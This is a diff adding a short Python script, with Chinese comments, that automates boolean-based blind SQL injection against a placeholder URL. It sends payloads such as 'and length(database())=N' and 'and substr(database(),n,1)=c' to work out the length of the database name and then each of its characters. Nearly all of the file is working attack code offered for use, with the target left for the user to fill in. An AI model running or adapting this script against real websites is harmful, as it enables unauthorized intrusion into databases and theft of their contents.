@@ -1,0 +1,46 @@
+import requests
+
+global char
+char = "abcdefghijklmnopqrstuvwxyz_@!#1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+global url
+url = f"获取你的URL"
+
+
+# 1 and substr(database(),{num},1)='{char}'
+
+def sendPayload(payload):
+    request = requests.get(url + payload)
+    request.encoding = "UTF-8"
+    if '{自行获取网站回显}' in request.text:
+        return True
+    return False
+
+
+def getDBLength():
+    length = 0
+    while True:
+        # print(length)
+        payload = f" and length(database())={length}"
+        if sendPayload(payload):
+            print("数据库名长度为:", length)
+            return length
+        length += 1
+
+
+def getDBName(length):
+    database = ""
+    for num in range(1, length + 1):
+        for letters in char:
+            payload = f" and substr(database(),{num},1)='{letters}'"
+            if sendPayload(payload):
+                database = database + letters
+                print("数据库名为", database)
+                break
+    return database
+
+
+if __name__ == '__main__':
+    # length = getDBLength()
+    database = getDBName(5)
+
